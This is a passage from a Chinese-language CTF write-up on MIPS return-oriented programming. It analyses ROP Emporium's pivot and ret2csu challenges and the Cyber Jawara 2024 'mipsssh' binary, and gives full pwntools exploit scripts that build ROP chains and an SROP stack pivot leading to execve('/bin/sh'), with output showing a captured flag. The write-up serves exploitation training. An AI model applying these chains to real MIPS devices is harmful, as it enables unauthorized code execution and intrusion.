.text:00400CA0                 lw      $t9, 8($sp)
.text:00400CA4                 lw      $t0, 4($sp)
.text:00400CA8                 jalr    $t9
.text:00400CAC                 addiu   $sp, 0xC

.text:00400CB0                 lw      $t9, 8($sp)
.text:00400CB4                 lw      $t2, 4($sp)
.text:00400CB8                 lw      $t1, 0($t2)
.text:00400CBC                 jalr    $t9
.text:00400CC0                 addiu   $sp, 0xC

.text:00400CC4                 add     $t9, $t0, $t1
.text:00400CC8                 jalr    $t9
.text:00400CCC                 addiu   $sp, 4

.text:00400CD0                 move    $sp, $fp
.text:00400CD4                 lw      $ra, 8($sp)
.text:00400CD8                 lw      $fp, 4($sp)
.text:00400CDC                 jr      $ra
.text:00400CE0                 addiu   $sp, 0xC
```

getget给了4段：

1. 设置 t0
2. 设置 t1 和 t2，t1的值来自t2指向的内存
3. 设置 t9 = t1 + t2，然后跳转 t9
4. 设置sp = fp，然后设置fp和ra（迁移用的

在覆盖返回地址的时候，同时也会覆盖到fp的值，跳转到gadget4的时候，fp的值被赋值给了sp，那么接下来栈就已经到了新的空间了

然后设置新的ra和fp进行后续的rop

思路：

1. gadget4完成迁移
2. 通过 gadget1 调用一下没用的函数foothold\_function，让got表中解析出其在so的地址
3. 计算出foothold\_function和ret2win的偏移
4. 通过 gadget2 和 3 计算出ret2win的地址
5. 通过 gadget4 进行执行ret2win

#### exp 核心代码

```
"""
.text:00400C44                 move    $sp, $fp
.text:00400C48                 lw      $ra, 0x38+var_s4($sp)
.text:00400C4C                 lw      $fp, 0x38+var_s0($sp)
.text:00400C50                 addiu   $sp, 0x40
.text:00400C54                 jr      $ra
.text:00400C58                 nop
"""


"""
; 赋值t0
.text:00400CA0 usefulGadgets:
.text:00400CA0                 lw      $t9, 8($sp)
.text:00400CA4                 lw      $t0, 4($sp)
.text:00400CA8                 jalr    $t9
.text:00400CAC                 addiu   $sp, 0xC

; 设置t2. t1=t2[0]
.text:00400CB0                 lw      $t9, 8($sp)
.text:00400CB4                 lw      $t2, 4($sp)
.text:00400CB8                 lw      $t1, 0($t2)
.text:00400CBC                 jalr    $t9
.text:00400CC0                 addiu   $sp, 0xC

; t9 = t0+t1
.text:00400CC4                 add     $t9, $t0, $t1
.text:00400CC8                 jalr    $t9
.text:00400CCC                 addiu   $sp, 4

; 栈迁移？
.text:00400CD0                 move    $sp, $fp
.text:00400CD4                 lw      $ra, 8($sp)
.text:00400CD8                 lw      $fp, 4($sp)
.text:00400CDC                 jr      $ra
.text:00400CE0                 addiu   $sp, 0xC
"""


"""
.MIPS.stubs:00400E60  # int foothold_function()
.MIPS.stubs:00400E60 _foothold_function:                      # DATA XREF: LOAD:0040052C↑o
.MIPS.stubs:00400E60                 lw      $t9, _GLOBAL_OFFSET_TABLE_
.MIPS.stubs:00400E64                 move    $t7, $ra
.MIPS.stubs:00400E68                 jalr    $t9
.MIPS.stubs:00400E6C                 li      $t8, 0x14
.MIPS.stubs:00400E6C  # End of function _foothold_function
"""

buf = 0x412000+0x28
ret2win = 0x0000D38
foothold_function_offset = 0x00009C0
foothold_function = 0x0400E60
foothold_function_got = 0x412060
gadget1 = 0x0400CA0
gadget2 = 0x0400CB0
gadget3 = 0x0400CC4
gadget4 = 0x0400CD0


ru(b"The Old Gods kindly bestow upon you a place to pivot: ")
leak = r(10)
leak = int(leak,16)
success(f"leak: {hex(leak)}")

rop = ROP(elf)
rop.raw(0xdddd)
rop.raw(leak)
rop.raw(gadget1)

rop.raw(0xdddd)
rop.raw(0xddda)
rop.raw(foothold_function)

rop.raw(0xdddd)
rop.raw(leak)
rop.raw(gadget1)

rop.raw(0xdddd)
rop.raw(ret2win-foothold_function_offset)
rop.raw(gadget2)

rop.raw(0xdddd)
rop.raw(foothold_function_got)
rop.raw(gadget3)

payload = rop.chain()
sla(b"> ", payload)


payload = cyclic(0x20) +pack(leak)+ pack(gadget4)
sla(b"> ", payload)
```

### 0x08 ret2csu\_mipsel

#### 题目分析&利用分析

pwnme在so文件里，

```
int pwnme()
{
  _BYTE s[32]; // [sp+18h] [+18h] BYREF

  setvbuf(stdout, 0, 2, 0);
  puts("ret2csu by ROP Emporium");
  puts("MIPS
");
  memset(s, 0, sizeof(s));
  puts("Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.
");
  printf("> ");
  read(0, s, 0x200u);
  return puts("Thank you!");
}
```

溢出地址口算：填充 32+4 = 0x24字节数据之后覆盖返回地址

ret2csu技巧源于csu代码片段的末尾：

```
.text:004009A0
.text:004009A0                loc_4009A0:                              # CODE XREF: __libc_csu_init+78↓j
.text:004009A0 00 00 19 8E                    lw      $t9, 0($s0)
.text:004009A4 01 00 31 26                    addiu   $s1, 1
.text:004009A8 25 30 A0 02                    move    $a2, $s5
.text:004009AC 25 28 80 02                    move    $a1, $s4
.text:004009B0 09 F8 20 03                    jalr    $t9
.text:004009B4 25 20 60 02                    move    $a0, $s3
.text:004009B8 F9 FF 51 16                    bne     $s2, $s1, loc_4009A0
.text:004009BC 04 00 10 26                    addiu   $s0, 4
.text:004009C0
.text:004009C0                loc_4009C0:                              # CODE XREF: __libc_csu_init+58↑j
.text:004009C0 34 00 BF 8F                    lw      $ra, 0x1C+var_s18($sp)
.text:004009C4 30 00 B5 8F                    lw      $s5, 0x1C+var_s14($sp)
.text:004009C8 2C 00 B4 8F                    lw      $s4, 0x1C+var_s10($sp)
.text:004009CC 28 00 B3 8F                    lw      $s3, 0x1C+var_sC($sp)
.text:004009D0 24 00 B2 8F                    lw      $s2, 0x1C+var_s8($sp)
.text:004009D4 20 00 B1 8F                    lw      $s1, 0x1C+var_s4($sp)
.text:004009D8 1C 00 B0 8F                    lw      $s0, 0x1C+var_s0($sp)
.text:004009DC 08 00 E0 03                    jr      $ra
.text:004009E0 38 00 BD 27                    addiu   $sp, 0x38
```

通过`loc_4009C0`操控s0-s5和ra寄存器，跳转到`loc_4009A0`利用move指令完成参数a0-a2以及跳转目标t9的赋值，然后跳转t9执行

ret2win函数：需要3个参数可控为指定值：

```
void __fastcall __noreturn ret2win(int a1, int a2, int a3)
{
  int i; // [sp+18h] [+18h]
  FILE *stream; // [sp+1Ch] [+1Ch]
  FILE *streama; // [sp+1Ch] [+1Ch]

  if ( a1 == 0xDEADBEEF && a2 == 0xCAFEBABE && a3 == 0xD00DF00D )
  {
    stream = fopen("encrypted_flag.dat", "r");
    if ( !stream )
    {
      puts("Failed to open encrypted_flag.dat");
      exit(1);
    }
    g_buf = (char *)malloc(0x21u);
    if ( !g_buf )
    {
      puts("Could not allocate memory");
      exit(1);
    }
    g_buf = fgets(g_buf, 33, stream);
    fclose(stream);
    streama = fopen("key.dat", "r");
    if ( !streama )
    {
      puts("Failed to open key.dat");
      exit(1);
    }
    for ( i = 0; i < 32; ++i )
      g_buf[i] ^= fgetc(streama);
    *((_DWORD *)g_buf + 1) ^= 0xDEADBEEF;
    *((_DWORD *)g_buf + 2) ^= 0xDEADBEEF;
    *((_DWORD *)g_buf + 3) ^= 0xCAFEBABE;
    *((_DWORD *)g_buf + 4) ^= 0xCAFEBABE;
    *((_DWORD *)g_buf + 5) ^= 0xD00DF00D;
    *((_DWORD *)g_buf + 6) ^= 0xD00DF00D;
    puts(g_buf);
    exit(0);
  }
  puts("Incorrect parameters");
  exit(1);
}
```

刚好通过csu的片段即可完成参数控制和ret2win的调用

#### exp 核心代码

```
"""
.text:004009A0 loc_4009A0:                              # CODE XREF: __libc_csu_init+78↓j
.text:004009A0                 lw      $t9, 0($s0)
.text:004009A4                 addiu   $s1, 1
.text:004009A8                 move    $a2, $s5
.text:004009AC                 move    $a1, $s4
.text:004009B0                 jalr    $t9
.text:004009B4                 move    $a0, $s3
.text:004009B8                 bne     $s2, $s1, loc_4009A0
.text:004009BC                 addiu   $s0, 4

.text:004009C0 loc_4009C0:                              # CODE XREF: __libc_csu_init+58↑j
.text:004009C0                 lw      $ra, 0x1C+var_s18($sp)
.text:004009C4                 lw      $s5, 0x1C+var_s14($sp)
.text:004009C8                 lw      $s4, 0x1C+var_s10($sp)
.text:004009CC                 lw      $s3, 0x1C+var_sC($sp)
.text:004009D0                 lw      $s2, 0x1C+var_s8($sp)
.text:004009D4                 lw      $s1, 0x1C+var_s4($sp)
.text:004009D8                 lw      $s0, 0x1C+var_s0($sp)
.text:004009DC                 jr      $ra
.text:004009E0                 addiu   $sp, 0x38
"""

# got.ret2win
ret2win = 0x0411058

gadget_csu1 = 0x04009C0
gadget_csu2 = 0x04009A0
rop = ROP(elf)
rop.raw(gadget_csu1)
for i in range(7):
    rop.raw(0xdeadbeef)
rop.raw(ret2win) # s0
rop.raw(0xdead01) # s1
rop.raw(0xdead02) # s2
"""
 if ( a1 == 0xDEADBEEF && a2 == 0xCAFEBABE && a3 == 0xD00DF00D )
"""
rop.raw(0xDEADBEEF) # s3
rop.raw(0xCAFEBABE) # s4
rop.raw(0xD00DF00D) # s5
rop.raw(gadget_csu2) # ra

payload = cyclic(0x24) + rop.chain()
sla(b"> ", payload)
```

ROPE{a\_placeholder\_32byte\_flag!}

## ROP进阶技巧：SROP，比赛真题分析

题目来源：The Cyber Jawara International 2024 - mipsssh

### 题目情况

静态链接的mips32 msb程序

```
    Arch:       mips-32-big
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

### 逆向分析

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[32]; // [sp+18h] [+18h] BYREF

  IO_setvbuf(stdout, 0, 2, 0);
  IO_setvbuf(stdin, 0, 2, 0);
  IO_setvbuf(stderr, 0, 2, 0);
  _read(0, v4, 4096);
  return 0;
}
```

虽然checksec上写了有canary，实际上main函数里没有检查：

```
.text:00400828                 nop
.text:0040082C                 lw      $gp, 0x38+var_28($fp)
.text:00400830                 li      $a2, 0x1000      # n4096
.text:00400834                 addiu   $v0, $fp, 0x38+var_20
.text:00400838                 move    $a1, $v0         # _DWORD
.text:0040083C                 move    $a0, $zero       # _DWORD
.text:00400840                 la      $v0, __read
.text:00400844                 move    $t9, $v0
.text:00400848                 bal     __read
.text:0040084C                 nop
.text:00400850                 lw      $gp, 0x38+var_28($fp)
.text:00400854                 move    $v0, $zero
.text:00400858                 move    $sp, $fp
.text:0040085C                 lw      $ra, 0x38+var_s4($sp)
.text:00400860                 lw      $fp, 0x38+var_s0($sp)
.text:00400864                 addiu   $sp, 0x40
.text:00400868                 jr      $ra
.text:0040086C                 nop
```

### 利用分析

当前情况：

* 劫持返回地址需要的填充是0x24字节，没有pie
* 程序是静态连接的，存在溢出，需要进行rop来利用
* 没有system函数，但是又syscall指令

拿shell的办法除了`system`函数，就是`syscall->execve/execveat`，后者需要绝对路径`/bin/sh\x00`​

需要把路径写入可知地址的内存中，那么就需要进行栈迁移到bss段之后再次调用main函数再次触发漏洞，这样写入的字符串地址就是可知的了

因为不能提前写入数据到bss段，所以栈迁移没法使用`move $sp,$fp`的gadget，用了控制不了ra寄存器了，只能通过srop进行

利用思路：

1. 通过 srop 进行栈迁移，设置sp到.bss段上，然后设置pc到main函数重新开始执行
2. 通过 srop 进行 syscall 调用 execve，srop填充参数寄存器最方便

‍

mips 的系统调用号：

```
pwn-mipsssh ➤ constgrep -c mips SYS_execve
#define SYS_execve   (4000 + 11)        const char *filename, const char *const *argv, const char *const *envp
#define SYS_execveat (4000 + 356)

pwn-mipsssh ➤ constgrep -c mips SYS_sigreturn
#define SYS_sigreturn (4000 + 119)
```

syscall 的 gadget：

```
0x0041407c: lw $s1, ($s2); lw $v0, 0x14($sp); syscall; jr $ra; move $v1, $a3;
0x00414080: lw $v0, 0x14($sp); syscall; jr $ra; move $v1, $a3;
0x00414090: lw $v0, 0x18($sp); syscall; jr $ra; move $v1, $a3;
0x004089d0: move $a3, $zero; addiu $v0, $zero, 0x108e; syscall; jr $ra; nop;
0x0041408c: move $v1, $a3; lw $v0, 0x18($sp); syscall; jr $ra; move $v1, $a3;
0x0045158c: nop; addiu $v0, $zero, 0xfb4; syscall; jr $ra; nop;
```

这里选择这一条：

```
.text:00414080  # __unwind {
.text:00414080                 lw      $v0, arg_14($sp)
.text:00414084                 syscall
.text:00414088                 jr      $ra
.text:0041408C                 move    $v1, $a3
.text:0041408C  # } // starts at 414080
```

因为srop执行syscall sigreturn的时候，用的是执行该指令时候的sp作为缓冲区保存context

所以这里gadget和frame是重合的

需要在frame+0x14的地方写入调用号，好在这不影响我们构造frame所需的参数

### 完整exp

```
gadget_syscall= 0x00414080
main = 0x0400790
buf = 0x496000
syscall = 0x0414084

# ==================== overflow 1 SROP->pivot stack

rop = ROP(elf)
rop.raw(gadget_syscall)

frame = SigreturnFrame(arch='mips')
frame.v0 = 4011
frame.sp = buf
frame.pc = main
a = unpack_many(bytes(frame))
a[5] = 4119
rop.raw(a)

payload = cyclic(0x20)+ pack(buf) + rop.chain() 
sl(payload)

# ===================== overflow 2 SROP->execve("/bin/sh",0,0)

binsh = 0x495fd8
rop = ROP(elf)
rop.raw(gadget_syscall)

frame = SigreturnFrame(arch='mips')
frame.a0 = binsh
frame.a1 = 0
frame.a2 = 0
frame.v0 = 4000+11
frame.pc = syscall
a = unpack_many(bytes(frame))
a[5] = 4119
rop.raw(a)

pause()
payload = b"/bin/sh\x00" + cyclic(0x18) + pack(buf) + rop.chain()
sl(payload)
```

```
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt
'
[DEBUG] Received 0x25 bytes:
    b'CJ{mipppssssshshshshhs_LINZ_IS_HERE}
'
CJ{mipppssssshshshshhs_LINZ_IS_HERE}
```

mips下的srop会存在frame和gadget加载参数重合的情况

mips下用srop进行栈迁移和syscall的调用是真方便

‍
